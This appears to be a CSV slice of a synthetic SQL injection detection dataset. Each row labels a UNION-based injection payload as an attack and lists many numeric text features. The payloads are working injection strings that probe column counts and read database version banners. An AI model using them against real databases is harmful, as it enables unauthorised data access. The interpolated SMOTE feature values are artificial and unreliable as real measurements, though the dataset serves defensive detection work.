id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000129,attack,union," select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",nearest_attack_euclidean,R000020,0.27527637775428815,79.30162131561289,33.32540532890322,4.216209522687471,40.0,2.3254053289032237,23.65081065780645,13.325405328903225,0.5046802919598943,0.02920237226754624,0.2981278832160423,0.16798945255651718,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.325405328903225,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000130,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000211,2.258234227656909,67.83899120294959,16.46233431078338,3.1862332732134853,42.301325513732955,1.0,14.0,10.53766568921662,0.6223769492180539,0.014806218870601948,0.20728706418842724,0.15552976772291693,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.4623343107833803,0.0,6.07533137843324,4.440892098500626e-16,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000131,attack,union,"-3721'  )   union all select 9050,9050--",nearest_attack_euclidean,R000216,1.0651305793146582,38.08905293972357,21.23562117588943,4.09585360481325,14.0,12.0,6.471242351778862,5.6178105879447156,0.3691094706027642,0.3163795462309408,0.1672409075381185,0.14727007562817654,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.6178105879447156,0.0,0.0,1.0,3.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.6178105879447157,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000132,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000053,0.0,97.0,27.0,3.7712694510833757,49.0,3.0,33.0,12.0,0.5051546391752577,0.030927835051546393,0.3402061855670103,0.12371134020618557,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000133,attack,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000030,0.058174635719506367,73.0,33.0,4.400124178606237,42.0,3.0,17.0,11.0,0.5753424657534246,0.0410958904109589,0.2328767123287671,0.1506849315068493,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.893154349576331,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000134,attack,union," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",nearest_attack_euclidean,R000040,0.10574617309703734,76.46226216160792,27.0,3.909977553260463,40.0,3.0,23.46226216160792,10.0,0.5231561027914701,0.03923670770936025,0.3068181638013021,0.13078902569786752,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,5.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000135,attack,union," select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000065,0.05027510925685792,87.0,27.0,3.7796252370681067,42.0,4.083621638455089,29.91637836154491,11.0,0.4827586206896552,0.04693817975235734,0.3438664179487921,0.12643678160919541,0.0,0.0,2.0,0.0,1.0,2.0,0.0,2.0,0.0,0.0,1.0,5.083621638455089,0.0,2.7755575615628914e-17,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000136,attack,union," select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000156,0.2778987938738253,97.12588080738735,25.125880807387354,4.02936978660101,63.0,4.0,23.0,7.125880807387354,0.6486502744723961,0.04118414441094578,0.23680883036293823,0.07335675075371995,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,2.7755575615628914e-17,1.0,0.12588080738735347,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000137,attack,union," select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000081,0.6781191712889093,77.51508951460174,26.0,3.9009032885288812,40.0,3.0,23.515089514601733,11.0,0.5160500198827723,0.038703751491207916,0.30333247315825734,0.1419137554677624,0.0,0.0,2.515089514601734,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,6.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000138,attack,union,"1""  )   union all select null#",nearest_attack_euclidean,R000269,0.985328921958083,32.07456084563249,15.159581603510192,3.375166796422132,18.0,1.0,9.595816035101917,3.478744810530575,0.5710526393632676,0.031725146631292625,0.29091317386666476,0.10630904013877503,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.3191632070203834,0.15958160351019177,0.0,0.0,4.440892098500626e-16,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000139,attack,union,"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",nearest_attack_euclidean,R000259,0.32438362475066057,70.6900249227215,22.884995846213084,3.8164730344542783,14.0,40.0,4.575020768934582,12.115004153786916,0.1983170123836061,0.5666200353817317,0.06367445193981444,0.17138850029484776,0.05750207689345843,0.9424979231065418,1.0,0.0,0.0,0.0,0.0,0.11500415378691664,1.0,0.0,8.0,1.0,0.05750207689345843,0.9424979231065416,0.0,1.0,0.0,0.0,0.05750207689345821,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000140,attack,union,"-8349  )   union all select 8126,8126#",nearest_attack_euclidean,R000279,0.16775257768171148,38.0,21.88641127172619,4.0976877649182875,14.0,12.227177456547626,7.772822543452374,4.000000000000001,0.3684210526315789,0.32176782780388485,0.2045479616697993,0.10526315789473684,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.9432056358630935,0.0,0.0,1.0567943641369066,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.9432056358630936,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000141,attack,union,"-8349  )   union all select 8126,8126#",nearest_attack_euclidean,R000279,0.8820344664025781,38.46319743437381,21.0,3.9354331967259624,14.0,10.979925873294803,9.489962936647402,3.9933086244316014,0.3821020583574472,0.2725245037706546,0.24543426855888364,0.09993916931301455,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.2483271561079003,0.0,0.0,0.744981468323701,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000142,attack,union," select * from users where id  =  1 or 1#""; union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000146,3.5262957855192543,81.0,27.0,3.8852146856306904,42.0,4.0,25.0,10.0,0.5185185185185185,0.04938271604938271,0.30864197530864196,0.12345679012345678,0.0,1.0,2.0,0.0,1.0,1.0,0.7194860264261096,2.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.7194860264261096,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000143,attack,union,"-9622' union all select 7208,7208,7208,7208#",nearest_attack_euclidean,R000266,0.5805103193976536,44.0,21.0,4.066756697250467,14.0,19.17068848697546,4.829311513024537,6.0,0.3181818181818182,0.43569746561307865,0.10975707984146679,0.13636363636363635,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.20732787825613475,0.0,0.0,2.7926721217438653,1.0,1.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.20732787825613475,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000144,attack,union," select * from users where id  =  1 or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000193,0.000287423535162906,116.99934877779377,27.0,3.8340797531350597,63.999837194448446,5.999918597224221,36.99959298612111,10.0,0.5470103214907605,0.05128161085301272,0.3162374715437779,0.08547059611244903,0.0,0.0,2.0,0.0,1.0000814027757792,2.9999185972242204,0.0,2.0,0.0,0.0,1.0,6.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,2.0,2.0,0.0,0.999918597224221,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.999918597224221
SMOTE_000145,attack,union,"-5859  )   as ernq where 8394  =  8394 union all select 8394,8394,8394--",nearest_attack_euclidean,R000237,0.19049605563368188,73.1679299963572,24.0,4.026815435040131,25.0,24.93434399708576,16.0,7.23358599927144,0.34256094350112865,0.3395980919344831,0.21923900384072234,0.09860196072366592,0.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.23358599927144,4.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000146,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000295,0.2537705171081833,61.205470507138855,18.241094101427773,3.526920259967763,14.301367626784714,32.48218820285554,4.361641152141658,10.060273525356942,0.2335844730223206,0.5313242158214352,0.07018262231248834,0.1649086888437558,0.0,1.0,3.0,0.0,0.0,0.06027352535694297,0.0,0.0,0.0,0.0,6.0,3.060273525356943,0.0,1.0,1.0,0.0,0.0,0.06027352535694297,0.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.06027352535694297,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0602735253569433
SMOTE_000147,attack,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000016,0.10869042733713258,101.23297662561909,25.0,4.026721101060329,64.97730216749211,4.255674458126971,24.0,8.0,0.6417417670621248,0.042102088356751305,0.23711710843584294,0.07903903614528097,0.0,0.0,2.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,1.0,6.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000148,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,1.3690701812709196,83.58427884756681,28.415721152433193,3.988132848362268,42.41572115243319,3.0,25.0,13.168557695133615,0.5075130328752987,0.03589316744941187,0.29910972874509895,0.1574840709301905,2.5842788475668073,1.5842788475668073,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.584278847566807,1.0,1.0,1.0,0.41572115243319285,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000149,attack,union," select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000102,0.9257758682294589,76.1887966740407,32.0,4.284271376731464,42.0,4.0,19.65733056170059,10.531466112340118,0.552119046244198,0.05258276630897124,0.2571138525308568,0.1381843349159739,0.0,0.0,2.0,0.0,1.0,1.531466112340118,0.0,0.0,0.0,0.0,1.0,6.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000150,attack,union,"-4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415#",nearest_attack_euclidean,R000242,0.8903585589736356,70.0388990570559,20.01944952852795,3.5787500065744404,14.0,41.359266038037276,4.0,10.679633019018635,0.2002097403023087,0.5903962894086444,0.05720278294351677,0.15219118734553022,0.3398165095093172,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.339816509509317,1.0,0.33981650950931724,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000151,attack,union," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000038,0.15648262526963036,102.46060274692367,27.06345850036192,4.126261888383927,61.58751974764751,5.126917000723843,23.777895248733277,11.96827074981904,0.6009208809774697,0.0503239373831494,0.23188854647701054,0.1168666351623704,3.0,0.0,2.0,0.0,0.9682707498190395,1.9682707498190395,0.0,0.03172925018096051,0.0,0.0,1.0317292501809605,6.9365414996380785,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.03172925018096051,0.0,0.0,0.0,1.0,2.0,1.0,1.9682707498190393,1.9682707498190393,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.9365414996380785
SMOTE_000152,attack,union," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000147,0.018283436619237318,83.0,28.028847253567346,3.9565834299675386,43.0,3.9711527464326553,25.0,11.028847253567344,0.5180722891566265,0.04784521381244164,0.30120481927710846,0.13287767775382345,2.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.0,1.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000153,attack,union,"-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#",nearest_attack_euclidean,R000210,0.777133838207112,76.30556540412539,20.217594234020897,3.3022975894922064,14.0,36.0,14.87037693608359,11.435188468041796,0.18365795627032833,0.4722633161237014,0.19440335054296526,0.149675377063005,0.0,0.21759423402089753,1.0,0.0,0.0,0.0,0.0,2.2175942340208974,0.0,0.0,7.0,1.0,0.0,0.2175942340208975,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000154,attack,union,"1"" union all select null,null,null,null--",nearest_attack_euclidean,R000283,2.201761771077737,52.034326922606695,14.540236378224721,3.1724820366523856,39.195272435505586,1.0,4.0,7.839054487101116,0.7489592353386596,0.020249783518721698,0.08099913407488676,0.14979184706773194,0.0,0.5402363782247208,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.298818108876396,2.0,0.0,0.5402363782247208,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000155,attack,union,"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",nearest_attack_euclidean,R000257,1.1394784142457601,79.39556019290843,22.60443980709157,3.752036714480823,20.81331942127471,36.37336115745059,11.81331942127471,10.39556019290843,0.26258812660844816,0.45737924437174826,0.14921633842514304,0.13081629059466054,0.0,1.0,3.0,0.0,0.0,1.0,0.0,0.3022199035457849,0.0,0.0,5.093340289362645,4.0,0.0,1.0,1.0,0.0,0.0,1.0,0.3022199035457849,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000156,attack,union,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000212,0.4773454093205767,88.59201132421722,24.759201132421722,3.799463364721582,48.518402264843445,9.0,20.07360905937378,11.0,0.548523409471457,0.10184125601438677,0.22516268827435018,0.12447264623980607,0.0,1.0,2.0,0.0,0.0,1.0,0.0,1.7592011324217227,0.0,0.0,5.2407988675782775,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000157,attack,union,"-5827""  )   as lskq where 7683  =  7683 union all select 7683,7683,7683,7683,7683#",nearest_attack_euclidean,R000223,0.6948059192221975,80.81954460387666,27.409772301938336,4.053063893523487,25.0,31.21302973591778,16.0,8.60651486795889,0.3096135084889415,0.38595041897002647,0.19815264543292255,0.10628342710810959,0.0,0.8032574339794449,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.8032574339794447,2.0,0.0,0.8032574339794449,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000158,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000136,0.0452430893577461,76.0,33.8006649375564,4.461063232035208,42.0,3.0,17.0,14.0,0.5526315789473685,0.039473684210526314,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000159,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000205,1.041834773367514,59.1492354802758,21.110878111369473,3.897474751230118,14.0,27.556487554522114,8.0,9.592747925753686,0.23923865698975988,0.46166670987407044,0.1367078039941485,0.1623868291420212,0.7036260371231572,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,4.8891218886305285,3.0,0.7036260371231572,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000160,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000136,0.0,76.0,34.0,4.466308891573198,42.0,3.0,17.0,14.0,0.5526315789473685,0.039473684210526314,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
